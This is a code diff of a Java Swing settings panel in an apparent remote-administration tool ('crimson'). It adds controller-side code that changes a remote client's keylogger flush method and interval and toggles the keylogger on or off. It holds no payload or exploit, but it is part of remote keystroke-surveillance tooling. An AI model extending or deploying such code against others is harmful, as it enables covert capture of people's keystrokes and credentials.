@@ -34,10 +34,12 @@ import javax.swing.JTextField;
 import javax.swing.SwingWorker;
 import javax.swing.border.EtchedBorder;
 
-import com.subterranean_security.crimson.core.proto.Generator.ClientConfig.FLUSH_METHOD;
+import com.subterranean_security.crimson.core.proto.ClientControl.RQ_ChangeSetting;
+import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
 import com.subterranean_security.crimson.core.proto.Keylogger.State;
 import com.subterranean_security.crimson.core.proto.Misc.Outcome;
 import com.subterranean_security.crimson.core.ui.StatusLabel;
+import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.viewer.net.ViewerCommands;
 import com.subterranean_security.crimson.viewer.ui.common.panels.epanel.EPanel;
 
@@ -61,10 +63,10 @@ public class Settings extends JPanel {
 	private JButton btnStart;
 	private StatusLabel sl;
 
-	public Settings(EPanel ep, int cid, boolean keyloggerStatus, FLUSH_METHOD method, int flushValue) {
+	public Settings(EPanel ep, int cid, State state, FLUSH_METHOD method, int flushValue) {
 		this.ep = ep;
 		this.cid = cid;
-		this.keyloggerStatus = keyloggerStatus;
+		this.keyloggerStatus = (state == State.ONLINE);
 		this.method = method;
 		this.flushValue = flushValue;
 		init();
@@ -88,7 +90,20 @@ public class Settings extends JPanel {
 
 					@Override
 					protected Void doInBackground() throws Exception {
-						// TODO Auto-generated method stub
+						RQ_ChangeSetting.Builder rq = RQ_ChangeSetting.newBuilder();
+						if (getMethod() != method) {
+							rq.setFlushMethod(getMethod());
+						}
+
+						if (CUtil.Validation.flushValue(textField.getText())
+								&& flushValue != Integer.parseInt(textField.getText())) {
+							rq.setFlushValue(Integer.parseInt(textField.getText()));
+						}
+
+						if (rq.hasFlushMethod() || rq.hasFlushValue()) {
+							ViewerCommands.changeSetting(cid, rq.build());
+						}
+
 						return null;
 					}
 
@@ -144,7 +159,8 @@ public class Settings extends JPanel {
 				new SwingWorker<Outcome, Void>() {
 					@Override
 					protected Outcome doInBackground() throws Exception {
-						return ViewerCommands.changeKeyloggerState(cid, keyloggerStatus ? State.OFFLINE : State.ONLINE);
+						return ViewerCommands.changeSetting(cid, RQ_ChangeSetting.newBuilder()
+								.setKeyloggerState(keyloggerStatus ? State.OFFLINE : State.ONLINE).build());
 					}
 
 					protected void done() {
@@ -186,6 +202,14 @@ public class Settings extends JPanel {
 		textArea.setBounds(12, 82, 276, 34);
 		panel.add(textArea);
 
+	}
+
+	private FLUSH_METHOD getMethod() {
+		if (((String) comboBox.getSelectedItem()).equals(methodStrings[0])) {
+			return FLUSH_METHOD.EVENT;
+		} else {
+			return FLUSH_METHOD.TIME;
+		}
 	}
 
 	private void refreshFlushMethod() {
